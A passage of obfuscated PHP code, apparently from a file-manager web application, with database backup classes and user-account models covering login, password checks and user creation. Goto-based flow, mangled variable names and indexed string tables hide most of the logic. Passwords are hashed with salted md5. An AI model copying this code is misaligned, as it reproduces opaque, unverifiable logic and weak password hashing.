($CªˆªãÆŒ as $fÈŞ®õ•) { if (!empty($fÈŞ®õ•[$b¹…›Ì›Ó•[28]]) && in_array($fÈŞ®õ•[$b¹…›Ì›Ó•[28]], $c‰ ÇƒĞÅ²)) { continue; } Model($b¹…›Ì›Ó•[702])->remove($fÈŞ®õ•[$b¹…›Ì›Ó•[367]]); $c¢Ë¬È¸»ä = "\173\x69\x6f\72{$c ”ä¿âÄ[$b¹…›Ì›Ó•[705]]}\175\x2f\x64\x61\x74\141\x62\141\x73\145\57\142\141\143\x6b\x75\160\137{$fÈŞ®õ•[$b¹…›Ì›Ó•[28]]}"; IO::remove($c¢Ë¬È¸»ä, !1); } goto Få”“ñ´›§; dŠ‹•´åŸ™: $C§ç÷øÆß = 0; $c‰ ÇƒĞÅ² = array(); foreach ($CªˆªãÆŒ as $fÈŞ®õ•) { if ($C§ç÷øÆß >= 7) { break; } $c‰ ÇƒĞÅ²[] = $fÈŞ®õ•[$b¹…›Ì›Ó•[28]]; $C§ç÷øÆß++; } goto c¬íĞŒ¬…à; Få”“ñ´›§: } public function db() { goto Dò¢¨•Áø; Dò¢¨•Áø: $BÆâ¿•ãÆ· =& $_SERVER[¯Ò¬Èè]; $AÂöÂ‰±‡™ = self::get(); if ($AÂöÂ‰±‡™[$BÆâ¿•ãÆ·[281]][$BÆâ¿•ãÆ·[708]][$BÆâ¿•ãÆ·[703]] == $BÆâ¿•ãÆ·[83]) { return !0; } goto A¸Š³‰¤•; A¸Š³‰¤•: $AÍ”‡´ï—Ü = new BackupDb(); if (!$AÍ”‡´ï—Ü->index()) { return !1; } self::set(array($BÆâ¿•ãÆ·[721] => 1)); goto c’‘¶ŠÎ¼´; c’‘¶ŠÎ¼´: return !0; goto E˜‚¨ò‹Ñ´; E˜‚¨ò‹Ñ´: } public function dbFile() { goto f‘»«èªÕ´; a£Âëâ“†: $A©ÓïÁÎö = new BackupDbFile(); if (!$A©ÓïÁÎö->index()) { return !1; } self::set(array($c´‡ÔÅ“ª[722] => 1)); goto fÇ¶îÀÑ¤; fÇ¶îÀÑ¤: return !0; goto E×Ü‹’«ä²; f‘»«èªÕ´: $c´‡ÔÅ“ª =& $_SERVER[¯Ò¬Èè]; $DÇ¥àÏ‹¥ = self::get(); if ($DÇ¥àÏ‹¥[$c´‡ÔÅ“ª[281]][$c´‡ÔÅ“ª[711]][$c´‡ÔÅ“ª[703]] == $c´‡ÔÅ“ª[83]) { return !0; } goto a£Âëâ“†; E×Ü‹’«ä²: } public function file() { $cù·äÑİ° =& $_SERVER[¯Ò¬Èè]; $fÄŒ‰¶İ’ = self::get(); if ($fÄŒ‰¶İ’[$cù·äÑİ°[281]][$cù·äÑİ°[167]][$cù·äÑİ°[703]] == $cù·äÑİ°[83]) { return !0; } if (!isset($fÄŒ‰¶İ’[$cù·äÑİ°[706]]) || $fÄŒ‰¶İ’[$cù·äÑİ°[706]] == $cù·äÑİ°[468]) { $E©Ë’Ñî‰‘ = new BackupFile(); if (!$E©Ë’Ñî‰‘->index()) { return !1; } } self::set(array($cù·äÑİ°[723] => 1, $cù·äÑİ°[703] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto EïŞÑÎ”«; càå«œ‹¡: foreach ($e‡Â¢Î½õÉ as $c‡ö“¥Éôˆ) { $dé·ñ‘÷… = $a“àøÕèª“ . $c‡ö“¥Éôˆ . $eâ—ËŒè÷[732]; $a¾¢ÔÁ‚ õ = null; if ($c‡ö“¥Éôˆ == $eâ—ËŒè÷[733] && (!isset($AØ¿Ò§í„›[$eâ—ËŒè÷[706]]) || $AØ¿Ò§í„›[$eâ—ËŒè÷[706]] == $eâ—ËŒè÷[468])) { $a¾¢ÔÁ‚ õ = self::$io; } $Cš„î¦Ï¸“ += $D†¨£ë…Ë->sqlFromDb($c‡ö“¥Éôˆ, $dé·ñ‘÷…, $E–±ŞŸ¾ôÆ, $a¾¢ÔÁ‚ õ); } $E–±ŞŸ¾ôÆ->end(); $e£ÏÙˆÛ™İ = array($eâ—ËŒè÷[734] => $eÃ÷Œ‡¿‹ø, $eâ—ËŒè÷[721] => 1, $eâ—ËŒè÷[735] => $Cš„î¦Ï¸“, $eâ—ËŒè÷[736] => $Cš„î¦Ï¸“); goto FÈ‚çÕÎª¿; D¶«‘ï–®: $e‡Â¢Î½õÉ = array_diff($e‡Â¢Î½õÉ, array($eâ—ËŒè÷[725], $eâ—ËŒè÷[726])); foreach ($e‡Â¢Î½õÉ as $c‡ö“¥Éôˆ) { $fÚŠÆÒ©²÷ += $D†¨£ë…Ë->model($c‡ö“¥Éôˆ)->count(); } $E–±ŞŸ¾ôÆ = new Task($eâ—ËŒè÷[727], $eâ—ËŒè÷[728], $fÚŠÆÒ©²÷, LNG($eâ—ËŒè÷[729]) . $eâ—ËŒè÷[730] . LNG($eâ—ËŒè÷[731])); goto càå«œ‹¡; Eø¹ÑœÒÒŠ: mk_dir($a“àøÕèª“); $fÚŠÆÒ©²÷ = $Cš„î¦Ï¸“ = 0; $e‡Â¢Î½õÉ = $D†¨£ë…Ë->db()->getTables(); goto D¶«‘ï–®; Fæôêø“°: self::$name = $AØ¿Ò§í„›[$eâ—ËŒè÷[28]]; $d‡¸ˆ²ˆÔ‡ = $GLOBALS[$eâ—ËŒè÷[6]][$eâ—ËŒè÷[17]]; $eÃ÷Œ‡¿‹ø = $this->_dbType($d‡¸ˆ²ˆÔ‡); goto a“‚¤ÛÕ¦; a“‚¤ÛÕ¦: $D†¨£ë…Ë = new DbManage($d‡¸ˆ²ˆÔ‡, $eÃ÷Œ‡¿‹ø); $a“àøÕèª“ = TEMP_FILES . $eâ—ËŒè÷[724] . self::$name . $eâ—ËŒè÷[8]; del_dir($a“àøÕèª“); goto Eø¹ÑœÒÒŠ; FÈ‚çÕÎª¿: Backup::set($e£ÏÙˆÛ™İ); return !0; goto CÊšÌ ©‚; EïŞÑÎ”«: $eâ—ËŒè÷ =& $_SERVER[¯Ò¬Èè]; $AØ¿Ò§í„› = Backup::get(); self::$io = $AØ¿Ò§í„›[$eâ—ËŒè÷[705]]; goto Fæôêø“°; CÊšÌ ©‚: } private function _dbType($F¥ë‚ùåâÃ) { goto f—Ü±ù¤î†; eÒ¯ÁïáÂª: return $A‰‚¢‘¿; goto cÖÕœê¾ˆ•; dƒÀÌëŠÏğ: if ($A‰‚¢‘¿ == $FğŸîíãù»[738]) { $f´†¼¦ğ† = explode($FğŸîíãù»[4], $F¥ë‚ùåâÃ[$FğŸîíãù»[739]]); $A‰‚¢‘¿ = $f´†¼¦ğ†[0]; } $f»Ö™Èòä¹ = array($FğŸîíãù»[740] => $FğŸîíãù»[9], $FğŸîíãù»[741] => $FğŸîíãù»[742]); if (isset($f»Ö™Èòä¹[$A‰‚¢‘¿])) { $A‰‚¢‘¿ = $f»Ö™Èòä¹[$A‰‚¢‘¿]; } goto eÒ¯ÁïáÂª; f—Ü±ù¤î†: $FğŸîíãù» =& $_SERVER[¯Ò¬Èè]; $F¥ë‚ùåâÃ = array_change_key_case($F¥ë‚ùåâÃ); $A‰‚¢‘¿ = $F¥ë‚ùåâÃ[$FğŸîíãù»[737]]; goto dƒÀÌëŠÏğ; cÖÕœê¾ˆ•: } } goto fÃ×ìœŞ™·; AĞÊØ £Á: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\152\x6f\x62\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x64\x65\163\143", "\163\157\x72\x74"); const JOB_KEY = "\x73\x65\x6c\146\x4a\157\x62\x4c\x69\x73\x74"; public function listData($B×Äˆ•º = false, $dêö´ÁÁàÔ = "\x73\157\x72\164", $eËŸöË÷à = false) { return parent::listData($B×Äˆ•º, $dêö´ÁÁàÔ, $eËŸöË÷à); } public function remove($bë»ä¸Ì¬é) { return parent::remove($bë»ä¸Ì¬é); } public function add($A§Í÷´§©Á) { $fÀÉŠ’µŞŸ =& $_SERVER[¯Ò¬Èè]; if ($this->findByName($A§Í÷´§©Á[$fÀÉŠ’µŞŸ[28]])) { return !1; } $A§Í÷´§©Á[$fÀÉŠ’µŞŸ[2135]] = $this->getSort(); return parent::insert($A§Í÷´§©Á); } private function getSort() { $b¾õ¹œÈÜ =& $_SERVER[¯Ò¬Èè]; $b×ˆöø¤÷² = parent::listData(); $DÄÚ¶µª = array_to_keyvalue($b×ˆöø¤÷², $b¾õ¹œÈÜ[33], $b¾õ¹œÈÜ[2135]); return empty($DÄÚ¶µª) ? 0 : max($DÄÚ¶µª) + 1; } public function update($F›§öÙ”àî, $EŸĞƒêÍ´Ó) { $BÑ‰èéÙ¾Í =& $_SERVER[¯Ò¬Èè]; $FÆ„á¾„¸Š = parent::listData($F›§öÙ”àî); $Fğ”ßƒœ´‘ = $this->findByName($EŸĞƒêÍ´Ó[$BÑ‰èéÙ¾Í[28]]); if (!$FÆ„á¾„¸Š || $Fğ”ßƒœ´‘ && $Fğ”ßƒœ´‘[$BÑ‰èéÙ¾Í[367]] != $FÆ„á¾„¸Š[$BÑ‰èéÙ¾Í[367]]) { return !1; } return parent::update($F›§öÙ”àî, $EŸĞƒêÍ´Ó); } public function setUserJob($aâ„¹œí“, $B¾Åñ…©†¸) { goto fÌßµÚ˜; eöš”êëª¾: $EİÒ•É×£ä = array_to_keyvalue($FÍËšõ™áà, $aãˆ„êïÕ‡[28]); $Dù˜á®òóó = $aãˆ„êïÕ‡[361]; foreach ($B¾Åñ…©†¸ as $c‘¡ÄĞ¼æÄ) { if ($EİÒ•É×£ä[$c‘¡ÄĞ¼æÄ]) { $Dù˜á®òóó .= $EİÒ•É×£ä[$c‘¡ÄĞ¼æÄ][$aãˆ„êïÕ‡[367]] . $aãˆ„êïÕ‡[47]; } else { $Eİ­ ”¢‚¾ = $this->add($c‘¡ÄĞ¼æÄ); $Dù˜á®òóó .= $Eİ­ ”¢‚¾ . $aãˆ„êïÕ‡[47]; } } goto A›İªá‚ã; fÌßµÚ˜: $aãˆ„êïÕ‡ =& $_SERVER[¯Ò¬Èè]; if (!is_array($B¾Åñ…©†¸)) { $B¾Åñ…©†¸ = array($B¾Åñ…©†¸); } $FÍËšõ™áà = parent::listData(); goto eöš”êëª¾; A›İªá‚ã: $Dù˜á®òóó = rtrim($Dù˜á®òóó, $aãˆ„êïÕ‡[47]); Model($aãˆ„êïÕ‡[477])->metaSet($aâ„¹œí“, self::JOB_KEY, $Dù˜á®òóó); goto fº¤Áñœ±; fº¤Áñœ±: } public function getUserJob($EßÅÖ¿Ñö) { $dé½†ÚÌÃ = Model($_SERVER[¯Ò¬Èè][477])->metaGet($EßÅÖ¿Ñö); return $this->getUserJobInfo($dé½†ÚÌÃ[self::JOB_KEY]); } public function getUserJobInfo($F™èªÁ˜îÏ) { goto Cˆ•ğÃŸ‘²; bÆÒÅ­ ‚„: $E—±ŠÂù¿ = array_remove_key($E—±ŠÂù¿, $eîœ¨¤ˆæ[187]); $b‡¡Õğ§Û™ = array(); foreach ($EÊŠëÂÜÑ as $fÙ»‡•àÇ) { if (isset($E—±ŠÂù¿[$fÙ»‡•àÇ])) { $b‡¡Õğ§Û™[] = $E—±ŠÂù¿[$fÙ»‡•àÇ]; } } goto AÂ’ğ¸œÓÂ; Cˆ•ğÃŸ‘²: $eîœ¨¤ˆæ =& $_SERVER[¯Ò¬Èè]; $EÊŠëÂÜÑ = explode($eîœ¨¤ˆæ[47], $F™èªÁ˜îÏ); $E—±ŠÂù¿ = parent::listData(); goto bÆÒÅ­ ‚„; AÂ’ğ¸œÓÂ: return $b‡¡Õğ§Û™; goto CæŒ¬é–‹Í; CæŒ¬é–‹Í: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\155\x65" => "\x75\x73\x65\x72\x5f\x6d\x65\x74\x61", "\155\x65\x74\141\106\151\x65\x6c\x64" => "\165\x73\x65\x72\x49\x44"); protected $simpleField = "\165\163\x65\162\111\x44\54\156\151\143\x6b\116\141\155\x65\54\x6e\141\155\145\54\x61\x76\x61\x74\141\162\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($aæ ÈÑÒƒò) { $E­ğÖå¸ô³ =& $_SERVER[¯Ò¬Èè]; $CÃ”ÜÔì¡… = $E­ğÖå¸ô³[2500]; return array($E­ğÖå¸ô³[2180] => array($aæ ÈÑÒƒò[0], $CÃ”ÜÔì¡…), $E­ğÖå¸ô³[2182] => array($aæ ÈÑÒƒò[0], $CÃ”ÜÔì¡…), $E­ğÖå¸ô³[2501] => array($aæ ÈÑÒƒò[0], $CÃ”ÜÔì¡…)); } protected function getInfo($eÇá„±Ä­, $aƒ©ó¤ƒ˜ì = false) { $cÇ·óŞÑ¸Ú = $this->getInfoSimple($eÇá„±Ä­); if (!is_array($cÇ·óŞÑ¸Ú)) { return array(); } if ($aƒ©ó¤ƒ˜ì) { return $this->_getInfoApply($cÇ·óŞÑ¸Ú); } return $this->cacheFunctionGet($_SERVER[¯Ò¬Èè][2222], $eÇá„±Ä­); } protected function getInfoFull($B­ì—ŞÒæ, $EŒÚ„¥à‹Ô = false) { $c‰¨ªÓŠ—¦ = $this->getInfoSimple($B­ì—ŞÒæ); if (!is_array($c‰¨ªÓŠ—¦)) { return array(); } if ($EŒÚ„¥à‹Ô) { return $this->_getInfoApply($c‰¨ªÓŠ—¦, !0); return $this->_getInfoApply($c‰¨ªÓŠ—¦, !0); } return $this->cacheFunctionGet($_SERVER[¯Ò¬Èè][2502], $B­ì—ŞÒæ); } private function _getInfoApply($C…Ğ«¿ÒÔ, $AŞ²öŞ§é = false) { goto f µæµ£ê½; AÛĞ«‡×ÂÏ: $C…Ğ«¿ÒÔ = $this->_listDataApplyItem($C…Ğ«¿ÒÔ); $cäÏ–•ÊøÄ = Model($D¢ÛÁªÉ–¤[1126])->metaGet($C…Ğ«¿ÒÔ[$D¢ÛÁªÉ–¤[391]][$D¢ÛÁªÉ–¤[369]]); $C…Ğ«¿ÒÔ[$D¢ÛÁªÉ–¤[2505]] = $b‘ÌˆÃ°; goto fÈ÷¬¹†¡ä; fÈ÷¬¹†¡ä: $C…Ğ«¿ÒÔ[$D¢ÛÁªÉ–¤[391]][$D¢ÛÁªÉ–¤[2339]] = isset($cäÏ–•ÊøÄ[$D¢ÛÁªÉ–¤[2340]]) ? $cäÏ–•ÊøÄ[$D¢ÛÁªÉ–¤[2340]] : null; if ($AŞ²öŞ§é) { $C…Ğ«¿ÒÔ[$D¢ÛÁªÉ–¤[417]] = $this->metaGet($C…Ğ«¿ÒÔ[$D¢ÛÁªÉ–¤[1446]]); } return $C…Ğ«¿ÒÔ; goto FÒöœ÷©; f µæµ£ê½: $D¢ÛÁªÉ–¤ =& $_SERVER[¯Ò¬Èè]; if (!$C…Ğ«¿ÒÔ) { return $C…Ğ«¿ÒÔ; } $b‘ÌˆÃ° = md5($D¢ÛÁªÉ–¤[2503] . $C…Ğ«¿ÒÔ[$D¢ÛÁªÉ–¤[811]] . $D¢ÛÁªÉ–¤[2504] . $C…Ğ«¿ÒÔ[$D¢ÛÁªÉ–¤[28]]); goto AÛĞ«‡×ÂÏ; FÒöœ÷©: } protected function getInfoSimple($EÄ¬È…ï¦ì, $BâØ»ĞÖ„´ = false) { $Cø›…„¼½è =& $_SERVER[¯Ò¬Èè]; if (!$EÄ¬È…ï¦ì) { return array(); } if ($BâØ»ĞÖ„´) { $F™ŞŠôí•Ã = $this->where(array($Cø›…„¼½è[1446] => intval($EÄ¬È…ï¦ì)))->find(); if (!is_array($F™ŞŠôí•Ã)) { return array(); } $F™ŞŠôí•Ã[$Cø›…„¼½è[2506]] = Action($Cø›…„¼½è[2507])->parseUrl($F™ŞŠôí•Ã[$Cø›…„¼½è[2506]]); return $F™ŞŠôí•Ã; } return $this->cacheFunctionGet($Cø›…„¼½è[2183], $EÄ¬È…ï¦ì); } protected function getInfoSimpleOuter($aÁÈ·£…æ…) { goto bÛ‚Àîá£Œ; fë¹íì™Šë: $Bà–ñÓ³ÜÂ = array_field_key($D¸áªÊ½áå, explode($AÄÔò„°°[47], $this->simpleField)); if (!$Bà–ñÓ³ÜÂ) { return array($AÄÔò„°°[1446] => $AÄÔò„°°[1040], $AÄÔò„°°[28] => $AÄÔò„°°[157] . LNG($AÄÔò„°°[2510]) . $AÄÔò„°°[476], $AÄÔò„°°[2506] => STATIC_PATH . $AÄÔò„°°[2511]); } $Bà–ñÓ³ÜÂ[$AÄÔò„°°[2506]] = Action($AÄÔò„°°[2507])->parseUrl($Bà–ñÓ³ÜÂ[$AÄÔò„°°[2506]]); goto dáĞºÒéĞ; bÛ‚Àîá£Œ: $AÄÔò„°° =& $_SERVER[¯Ò¬Èè]; if (!$aÁÈ·£…æ… || $aÁÈ·£…æ… == 0) { return array($AÄÔò„°°[1446] => $AÄÔò„°°[468], $AÄÔò„°°[28] => $AÄÔò„°°[157] . LNG($AÄÔò„°°[2508]) . $AÄÔò„°°[476], $AÄÔò„°°[2506] => STATIC_PATH . $AÄÔò„°°[2509]); } $D¸áªÊ½áå = $this->cacheFunctionGet($AÄÔò„°°[2183], $aÁÈ·£…æ…); goto fë¹íì™Šë; dáĞºÒéĞ: return $Bà–ñÓ³ÜÂ; goto Dæ„¸¦ø; Dæ„¸¦ø: } protected function groupUser($D«†º¼¼œ”) { } public static function errorLang($dòïÍŠõí£) { $EªäÍÓî½ =& $_SERVER[¯Ò¬Èè]; $B½Œâò¬ù« = array(self::ERROR_USER_NOT_EXISTS => $EªäÍÓî½[2512], self::ERROR_USER_PASSWORD_ERROR => $EªäÍÓî½[2513], self::ERROR_USER_EXIST_NAME => $EªäÍÓî½[2514], self::ERROR_USER_EXIST_PHONE => $EªäÍÓî½[2515], self::ERROR_USER_EXIST_EMAIL => $EªäÍÓî½[2516], self::ERROR_USER_LOGIN_LOCK => $EªäÍÓî½[2517], self::ERROR_IP_NOT_ALLOW => $EªäÍÓî½[2518], self::ERROR_USER_EXIST_NICKNAME => $EªäÍÓî½[2519]); return LNG($B½Œâò¬ù«[$dòïÍŠõí£]); } public function getInfoByMeta($A”ÛØÛİ´ç, $CË¶”ÖšÈ) { $B–…ÎöÎ¤Ò =& $_SERVER[¯Ò¬Èè]; $e†”£‘´ÆÖ = Model($B–…ÎöÎ¤Ò[2520])->where(array($B–…ÎöÎ¤Ò[89] => $A”ÛØÛİ´ç, $B–…ÎöÎ¤Ò[359] => $CË¶”ÖšÈ))->find(); if ($e†”£‘´ÆÖ) { return $this->getInfo($e†”£‘´ÆÖ[$B–…ÎöÎ¤Ò[1446]]); } return !1; } public function userLoginCheck($A…Êí•ğ·, $aÎ¢³Ğ´•Ñ) { goto cìÅƒ’ƒ‹¡; Aƒ¶ÖŞ‘¿: $this->userEdit($f™×†£¤Î[$BèÚÆ‰‡¾ˆ[1446]], array($BèÚÆ‰‡¾ˆ[2522] => time())); return $this->getInfo($f™×†£¤Î[$BèÚÆ‰‡¾ˆ[1446]]); goto dïË¶’®Øê; cìÅƒ’ƒ‹¡: $BèÚÆ‰‡¾ˆ =& $_SERVER[¯Ò¬Èè]; $Fääô‘ª²¯ = array($BèÚÆ‰‡¾ˆ[28] => $A…Êí•ğ·, $BèÚÆ‰‡¾ˆ[2343] => $A…Êí•ğ·, $BèÚÆ‰‡¾ˆ[293] => $A…Êí•ğ·, $BèÚÆ‰‡¾ˆ[2521] => $A…Êí•ğ·, $BèÚÆ‰‡¾ˆ[923] => $BèÚÆ‰‡¾ˆ[925]); if ($this->nickNameRpt()) { unset($Fääô‘ª²¯[$BèÚÆ‰‡¾ˆ[2343]]); } goto FˆªÅ§Ä”ï; FˆªÅ§Ä”ï: $f™×†£¤Î = $this->where($Fääô‘ª²¯)->find(); if (!$f™×†£¤Î) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($f™×†£¤Î[$BèÚÆ‰‡¾ˆ[1446]], $aÎ¢³Ğ´•Ñ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto Aƒ¶ÖŞ‘¿; dïË¶’®Øê: } public function clearCache($d¶Ú‹«ñÎŒ) { $F‹¯òÜÈª‚ =& $_SERVER[¯Ò¬Èè]; $this->cacheFunctionClear($F‹¯òÜÈª‚[2222], $d¶Ú‹«ñÎŒ); $this->cacheFunctionClear($F‹¯òÜÈª‚[2183], $d¶Ú‹«ñÎŒ); $this->cacheFunctionClear($F‹¯òÜÈª‚[2502], $d¶Ú‹«ñÎŒ); } public function userPasswordCheck($EÈ„ÀŠÜ¢Ô, $E‚àÒ°çĞ) { $bİ¶ªæ‚´ç =& $_SERVER[¯Ò¬Èè]; $e´ƒßñ¡‡¯ = $this->where(array($bİ¶ªæ‚´ç[1446] => intval($EÈ„ÀŠÜ¢Ô)))->find(); $c‰õ¡¨óó˜ = $this->metaGet($EÈ„ÀŠÜ¢Ô); $F³µ„Æ®Ö = isset($c‰õ¡¨óó˜[$bİ¶ªæ‚´ç[2523]]) ? $c‰õ¡¨óó˜[$bİ¶ªæ‚´ç[2523]] : $bİ¶ªæ‚´ç[33]; if (md5($F³µ„Æ®Ö . trim($E‚àÒ°çĞ)) !== $e´ƒßñ¡‡¯[$bİ¶ªæ‚´ç[811]]) { return !1; } return !0; } public function userAdd($E¨´‚°²Çù) { goto c½ÆìÑ•ìİ; Eœ…Âø’“§: $bÄÛé®‘µæ = $this->_checkExist($E¨´‚°²Çù); if ($bÄÛé®‘µæ !== !0) { return $bÄÛé®‘µæ; } $Dİ£Ìò‰Ã‹ = $this->add($ağ÷·²Ò¯Ø); goto eªîµŒ¶¤Ù; eù‚ºÓÀ¶×: return $Dİ£Ìò‰Ã‹; goto dğÑˆ“Ö§š; c½ÆìÑ•ìİ: $E¶’Ü¼†‘  =& $_SERVER[¯Ò¬Èè]; $ağ÷·²Ò¯Ø = array($E¶’Ü¼†‘ [386] => $E¨´‚°²Çù[$E¶’Ü¼†‘ [28]], $E¶’Ü¼†‘ [2524] => $E¨´‚°²Çù[$E¶’Ü¼†‘ [1332]], $E¶’Ü¼†‘ [2525] => isset($E¨´‚°²Çù[$E¶’Ü¼†‘ [293]]) ? $E¨´‚°²Çù[$E¶’Ü¼†‘ [293]] : $E¶’Ü¼†‘ [33], $E¶’Ü¼†‘ [2526] => isset($E¨´‚°²Çù[$E¶’Ü¼†‘ [2521]]) ? $E¨´‚°²Çù[$E¶’Ü¼†‘ [2521]] : $E¶’Ü¼†‘ [33], $E¶’Ü¼†‘ [2527] => isset($E¨´‚°²Çù[$E¶’Ü¼†‘ [2343]]) ? $E¨´‚°²Çù[$E¶’Ü¼†‘ [2343]] : $E¨´‚°²Çù[$E¶’Ü¼†‘ [28]], $E¶’Ü¼†‘ [2528] => isset($E¨´‚°²Çù[$E¶’Ü¼†‘ [2506]]) ? $E¨´‚°²Çù[$E¶’Ü¼†‘ [2506]] : $E¶’Ü¼†‘ [33], $E¶’Ü¼†‘ [2529] => isset($E¨´‚°²Çù[$E¶’Ü¼†‘ [2530]]) ? $E¨´‚°²Çù[$E¶’Ü¼†‘ [2530]] : 1, $E¶’Ü¼†‘ [2531] => $E¨´‚°²Çù[$E¶’Ü¼†‘ [811]], $E¶’Ü¼†‘ [2184] => isset($E¨´‚°²Çù[$E¶’Ü¼†‘ [2098]]) ? $E¨´‚°²Çù[$E¶’Ü¼†‘ [2098]] : 1024 * 1024 * 20, $E¶’Ü¼†‘ [2185] => 0, $E¶’Ü¼†‘ [2522] => 0, $E¶’Ü¼†‘ [2209] => isset($E¨´‚°²Çù[$E¶’Ü¼†‘ [703]]) ? $E¨´‚°²Çù[$E¶’Ü¼†‘ [703]] : 1); if (!empty($E¨´‚°²Çù[$E¶’Ü¼†‘ [1446]])) { $ağ÷·²Ò¯Ø[$E¶’Ü¼†‘ [1446]] = $E¨´‚°²Çù[$E¶’Ü¼†‘ [1446]]; } goto Eœ…Âø’“§; eªîµŒ¶¤Ù: $f­­½Óƒ”² = array($E¶’Ü¼†‘ [2531] => $ağ÷·²Ò¯Ø[$E¶’Ü¼†‘ [811]], $E¶’Ü¼†‘ [2527] => $ağ÷·²Ò¯Ø[$E¶’Ü¼†‘ [2343]]); $this->userEdit($Dİ£Ìò‰Ã‹, $f­­½Óƒ”²); Model($E¶’Ü¼†‘ [1126])->userRootAdd($Dİ£Ìò‰Ã‹); goto eù‚ºÓÀ¶×; dğÑˆ“Ö§š: } protected function userEditTest($Dé÷‚ò¤‡Š, $fŸÄÖÕ«âõ) { return $this->call($_SERVER[¯Ò¬Èè][2532], $Dé÷‚ò¤‡Š, $fŸÄÖÕ«âõ); } protected function userEdit($fù¨Î„ù–, $CÚ±áù¸Æ§) { goto BÁôË¾Èš; BÁôË¾Èš: $A±”Ô‚“–ª =& $_SERVER[¯Ò¬Èè]; $Bã”…âõª‚ = $this->getInfoSimple($fù¨Î„ù–); if (!$Bã”…âõª‚) { return !1; } goto C¾©‡•í˜î; C¾©‡•í˜î: $FŠÃÜÎéÕ = $this->_checkExist($CÚ±áù¸Æ§, $fù¨Î„ù–); if ($FŠÃÜÎéÕ !== !0) { return $FŠÃÜÎéÕ; } if (isset($CÚ±áù¸Æ§[$A±”Ô‚“–ª[811]]) && trim($CÚ±áù¸Æ§[$A±”Ô‚“–ª[811]]) != $A±”Ô‚“–ª[33]) { $Eë©‹µŠÑ = $this->metaGet($fù¨Î„ù–); if (empty($Eë©‹µŠÑ[$A±”Ô‚“–ª[2523]])) { $Eë©‹µŠÑ[$A±”Ô‚“–ª[2523]] = rand_string(10); Model($A±”Ô‚“–ª[474])->metaSet($fù¨Î„ù–, $A±”Ô‚“–ª[2523], $Eë©‹µŠÑ[$A±”Ô‚“–ª[2523]]); } $CÚ±áù¸Æ§[$A±”Ô‚“–ª[811]] = md5($Eë©‹µŠÑ[$A±”Ô‚“–ª[2523]] . trim($CÚ±áù¸Æ§[$A±”Ô‚“–ª[811]])); } else { unset($CÚ±áù¸Æ§[$A±”Ô‚“–ª[811]]); } goto fˆ¼Ìå³²ô; F¢Â¼÷½¤: return !0; goto Eóñ¶¤”»ä; fˆ¼Ìå³²ô: $this->where(array($A±”Ô‚“–ª[1437] => $fù¨Î„ù–))->save($CÚ±áù¸Æ§); if (isset($CÚ±áù¸Æ§[$A±”Ô‚“–ª[2343]])) { $this->setNamePinyin($fù¨Î„ù–, $CÚ±áù¸Æ§[$A±”Ô‚“–ª[2343]]); } $this->clearCache($Eêè„±Úíø[$A±”Ô‚“–ª[1446]]); goto F¢Â¼÷½¤; Eóñ¶¤”»ä: } public function setNamePinyin($c–ğÒêÕ–£, $CêîËÆ‚Š = false) { $FËáŞ²äÑÀ =& $_SERVER[¯Ò¬Èè]; if (!$CêîËÆ‚Š) { $EòùÒ£•¤§ = $this->getInfoSimple($c–ğÒêÕ–£); $CêîËÆ‚Š = $EòùÒ£•¤§[$FËáŞ²äÑÀ[2343]] ? $EòùÒ£•¤§[$FËáŞ²äÑÀ[2343]] : $EòùÒ£•¤§[$FËáŞ²äÑÀ[28]]; } $BŒ¼ğŒˆãİ = Model($FËáŞ²äÑÀ[477]); if (!Input::check($CêîËÆ‚Š, $FËáŞ²äÑÀ[537])) { return $BŒ¼ğŒˆãİ->metaSet($c–ğÒêÕ–£, array($FËáŞ²äÑÀ[416] => $FËáŞ²äÑÀ[33], $FËáŞ²äÑÀ[415] => $FËáŞ²äÑÀ[33])); } return $BŒ¼ğŒˆãİ->metaSet($c–ğÒêÕ–£, array($FËáŞ²äÑÀ[416] => str_replace($FËáŞ²äÑÀ[50], $FËáŞ²äÑÀ[33], Pinyin::encode($CêîËÆ‚Š)), $FËáŞ²äÑÀ[415] => Pinyin::encode($CêîËÆ‚Š, $FËáŞ²äÑÀ[538]))); } private function nickNameRpt() { $D«„“Á¦—Ş =& $_SERVER[¯Ò¬Èè]; $c‚¡ÕÍ´ˆÅ = Model($D«„“Á¦—Ş[1097])->get($D«„“Á¦—Ş[2533]); $CÍæˆ‹×ù½ = $GLOBALS[$D«„“Á¦—Ş[6]][$D«„“Á¦—Ş[2489]][$D«„“Á¦—Ş[2533]]; $B«ƒ’‰ª³ù = !is_null($c‚¡ÕÍ´ˆÅ) ? $c‚¡ÕÍ´ˆÅ : $CÍæˆ‹×ù½; return !!$B«ƒ’‰ª³ù; } private function _checkExist($AìÊ½êå¿Á, $D‘˜Å×¼© = false) { $f×¤Û‚àä =& $_SERVER[¯Ò¬Èè]; $Fô¨ÕßÃî = array($f×¤Û‚àä[28] => UserModel::ERROR_USER_EXIST_NAME, $f×¤Û‚àä[2343] => UserModel::ERROR_USER_EXIST_NICKNAME, $f×¤Û‚àä[293] => UserModel::ERROR_USER_EXIST_EMAIL, $f×¤Û‚àä[2521] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Fô¨ÕßÃî[$f×¤Û‚àä[2343]]); } $EÚİ¼›®–Æ = $D‘˜Å×¼© ? array($f×¤Û‚àä[1446] => array($f×¤Û‚àä[2534], $D‘˜Å×¼©)) : array(); foreach ($Fô¨ÕßÃî as $dÙÆëÖ´ Ö => $Fù¦ÅœÑ“Ğ) { if (!isset($AìÊ½êå¿Á[$dÙÆëÖ´ Ö]) || !$AìÊ½êå¿Á[$dÙÆëÖ´ Ö]) { continue; } $E–ù§—ÅŠ = array_merge(array($dÙÆëÖ´ Ö => $AìÊ½êå¿Á[$dÙÆëÖ´ 